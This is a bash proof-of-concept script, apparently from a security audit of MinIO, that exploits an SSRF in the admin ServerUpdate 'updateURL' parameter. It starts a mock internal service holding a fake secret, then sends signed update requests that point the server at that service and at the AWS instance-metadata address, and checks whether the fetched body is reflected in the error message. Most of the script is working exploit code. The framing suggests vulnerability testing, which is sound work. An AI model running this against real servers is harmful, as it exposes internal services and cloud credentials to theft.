#!/usr/bin/env bash
# F-06 — ServerUpdate `updateURL` SSRF + full response-body exfiltration.
# A holder of admin:ServerUpdate makes MinIO fetch an arbitrary internal URL; the body is
# reflected verbatim into the JSON error. (Loopback is blocked; use a LAN/RFC1918/IMDS target.)
# Prereq: setup/01-single-node.sh (run against node A :19000 or single :9000). Needs a reachable
#         internal HTTP service to demonstrate reflection.
set -euo pipefail
. "$(dirname "$0")/../../setup/env.sh"
HARNESS="$(cd "$(dirname "$0")/../../harness" && pwd)"
T=${1:-$S1}
# LAN IP the minio process can reach (loopback is filtered). Override as needed.
LANIP=${LANIP:-$(hostname -I 2>/dev/null | awk '{print $1}')}
[ -z "${LANIP:-}" ] && LANIP=127.0.0.1

echo "=== stand up a mock 'internal service' returning a secret, reachable via $LANIP:8899 ==="
docker rm -f mock-internal >/dev/null 2>&1 || true
mkdir -p /tmp/mock-internal; printf 'SECRET-IMDS-CREDS-AKIAEXAMPLE-token-xyz\n' > /tmp/mock-internal/creds
docker run -d --name mock-internal --network host -v /tmp/mock-internal:/srv -w /srv python:3-alpine python3 -m http.server 8899 >/dev/null
sleep 2

echo "=== attack: admin:ServerUpdate -> updateURL points at the internal service ==="
echo "    (this PoC signs with root to demonstrate the primitive; the gate is the scoped admin:ServerUpdate action)"
python3 - "$T" "$HARNESS" "$LANIP" <<'PY'
import sys; T,HARNESS,LANIP=sys.argv[1],sys.argv[2],sys.argv[3]
sys.path.insert(0,HARNESS); import s3sig
host=T.split("//",1)[1]
for url,label in [(f"http://{LANIP}:8899/creds","internal LAN service"),
                  ("http://169.254.169.254/latest/meta-data/","AWS IMDS")]:
    st,h,b=s3sig.send("minioadmin","minioadmin123","POST","/minio/admin/v3/update",
                      query={"updateURL":url},payload=b"",host=host)
    body=b.decode(errors="replace")
    print(f"  updateURL={url}")
    print(f"    HTTP {st}  reflected-secret={'SECRET-IMDS-CREDS-AKIAEXAMPLE' in body}")
    print(f"    body: {body[:180]}")
PY
echo
echo "VULNERABLE if: the LAN target returned HTTP 500 with the secret reflected in the JSON Message."
